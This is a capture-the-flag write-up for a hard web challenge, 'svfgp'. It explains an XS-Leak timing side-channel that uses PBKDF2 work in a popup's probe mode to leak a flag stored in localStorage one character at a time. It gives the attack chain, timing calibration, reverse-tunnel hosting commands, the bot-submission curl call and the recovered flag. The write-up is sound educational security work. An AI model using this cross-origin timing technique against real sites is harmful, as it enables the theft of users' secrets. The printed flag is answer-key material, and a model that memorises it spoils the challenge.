# svfgp

| Field       | Value                              |
|-------------|-------------------------------------|
| Platform    | UNbreakable International 2026     |
| Category    | web                                |
| Difficulty  | Hard                               |

## Description
> Can you solve it? No. Does it have a solution? Yes.

## TL;DR
XS-Leak timing side-channel: the app's "probe mode" runs PBKDF2 (3M iterations) only when the candidate is a correct prefix of the sealed secret. By opening popups to the probe endpoint and measuring postMessage response timing, we exfiltrate the flag one character at a time.

## Initial analysis

### Architecture

```
Browser --> svfgp.breakable.live (static HTML + client-side JS)
              ├── localStorage: notes (including "sealed" notes with flag)
              ├── DOMPurify 2.4.1 sanitization
              └── Probe mode: timing oracle via PBKDF2

Bot (Puppeteer) --> stores FLAG as sealed note in localStorage
                --> visits attacker URL
```

### CSP (very restrictive)
```
default-src 'self'; script-src 'self'; style-src 'self';
img-src 'self' data:; base-uri 'none'; form-action 'self'; object-src 'none'
```
No inline scripts, no external resources. XSS is effectively impossible.

### App flow (app.js)

1. **View mode** (default): Render notes from localStorage, handle shared notes via `?note=` param
2. **Probe mode** (`?mode=probe`): The key vulnerability
   - Reads `q` (candidate), `rid` (request ID) from query params
   - Loads the "secret" (content of the first sealed note in localStorage)
   - If `secret.startsWith(candidate)` → runs PBKDF2 with **3,000,000 iterations**
   - Sends `postMessage({type: "svfgp-probe-done", rid}, "*")` to `window.opener`

### Protections
- **DOMPurify 2.4.1**: Sanitizes all user HTML content
- **CSP script-src 'self'**: Blocks inline scripts even with DOMPurify bypass
- **localStorage only**: No server-side API to leak data from
- **PBKDF2 via Web Crypto API**: Async, hardware-accelerated

## Identified vulnerability

### Type: XS-Leak Timing Side-Channel (CWE-208: Observable Timing Discrepancy)

The probe mode creates a timing oracle:

```javascript
async function runProbeMode() {
  const candidate = boot.q || param("q");
  const secret = loadSecret();  // sealed note content = FLAG

  if (secret && candidate && secret.startsWith(candidate)) {
    await deriveHash(secret);  // PBKDF2 3M iterations = ~400ms on bot hardware
  }

  window.opener.postMessage({ type: "svfgp-probe-done", sid, rid }, "*");
}
```

**Observable timing difference:**
- Wrong candidate: ~150ms (page load only)
- Correct candidate: ~550ms (page load + PBKDF2 ~400ms)

### Attack chain

```
Attacker page (hosted externally)
  │
  ├── window.open("https://svfgp.breakable.live/?mode=probe&q=CTF{1&rid=xxx")
  │     │
  │     ├── Bot's localStorage has sealed note with FLAG
  │     ├── "CTF{1".startsWith matches → PBKDF2 runs (~400ms)
  │     └── postMessage back to opener after ~550ms total
  │
  └── Measures time between open and postMessage
      ├── < 280ms → wrong character
      └── > 280ms → correct character (PBKDF2 was triggered)
```

## Solution process

### Step 1: Reconnaissance

Identify the key components:
- DOMPurify 2.4.1 + strict CSP → XSS ruled out
- Probe mode with PBKDF2 timing → prefix oracle
- Bot stores flag as sealed note → accessible via probe

### Step 2: Calibrate bot timing

First run with full diagnostics:
```
wrong_candidate = 150ms
C = 566ms   ← outlier! ~400ms more than baseline
U = 140ms
A-Z, a-z, 0-9 = 130-170ms (except C ~530ms)
```

PBKDF2 on the bot's hardware only adds ~400ms. Threshold adjusted to 280ms.

### Step 3: Implement sequential exploit

Strategy: a single reusable popup, sequential navigation through candidates.

```javascript
// For each character, navigate the popup to the probe URL
// If postMessage arrives before 280ms → wrong character
// If timeout at 280ms → probable match → confirm with long timeout
```

Speed: ~150ms per incorrect character, ~5s per position (62-char charset).

### Step 4: Multiple bot visits

With ~60s per bot visit and ~5s per position:
- Visit 1: Detect prefix CTF{ + ~12 hex chars
- Visit 2: +15 hex chars
- Visit 3: +15 hex chars
- Visit 4: +6 hex chars + }

The known prefix is passed via URL hash (`#CTF%7B1390e7...`).

### Step 5: Exploit hosting

- Local Python server on port 9999
- SSH tunnel via `localhost.run` for a public HTTPS URL
- `ssh -R 80:localhost:9999 nokey@localhost.run`

## Discarded approaches

- **DOMPurify mXSS bypass (CVE-2024-45801)**: DOMPurify 2.4.1 is vulnerable, but CSP `script-src 'self'` blocks execution even with a sanitization bypass.
- **CSS injection via style tags**: CSP `style-src 'self'` blocks inline styles.
- **Parallel probing (16 simultaneous windows)**: Too many windows cause many to not load in time, generating false positives. Batches of 4-8 were also unreliable.
- **iframe-based probing**: The probe mode uses `window.opener.postMessage()`, not `window.parent`. Iframes do not have `window.opener`.

## Final exploit

### exploit.html
Page served to the bot that:
1. Opens a popup to `about:blank`
2. Detects the flag prefix (CTF{)
3. For each position, navigates the popup to probe URLs with each candidate
4. Measures time until postMessage is received
5. If timeout (280ms) → confirms with long timeout (800ms)
6. Reports progress to the server via fetch

### server.py
HTTP server that:
- Serves exploit.html at `/`
- Receives reports at `/report?key=value`
- Logs everything to stdout and file

### solve.py
Orchestrator that:
1. Starts local server
2. Creates SSH tunnel
3. Sends URL to the bot via `/api/submit`
4. Waits for results and updates prefix
5. Repeats until the full flag is obtained

## Execution

```bash
# Terminal 1: Server
python3 server.py > server.log 2>&1 &

# Terminal 2: Tunnel
ssh -R 80:localhost:9999 nokey@localhost.run

# Terminal 3: Send to bot (repeat with updated prefix)
curl -X POST 'https://svfgp-bot.breakable.live/api/submit' \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://TUNNEL_URL/#CTF%7Bknown_prefix"}'

# Monitor results
tail -f server.log
```

4 iterations to obtain the 64 hex chars + prefix + closing brace.

## Flag
```
CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f6cc2da658}
```

## Key Lessons

- **XS-Leak timing oracles** are viable even with very fast PBKDF2 (~400ms). The key is calibrating the threshold to the bot's hardware, not assuming values.
- **Sequential probing > parallel**: Opening many simultaneous windows causes network/CPU contention that generates false positives. A single reusable popup is slower but 100% reliable.
- **Strict CSP does not block XS-Leaks**: Even with `script-src 'self'` and DOMPurify, the timing side-channel via `postMessage` works because it does not require script injection in the target.
- The `window.opener.postMessage("*")` pattern is a cross-origin communication channel that is not restricted by CSP.
- `localhost.run` via SSH is a quick alternative to ngrok for CTFs when no tunneling tools are installed.

## References

- [XS-Leaks Wiki](https://xsleaks.dev/) - Timing attacks via window references
- [PBKDF2 Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/deriveBits)
- [postMessage security](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [DOMPurify 2.4.1](https://github.com/cure53/DOMPurify/releases/tag/2.4.1)
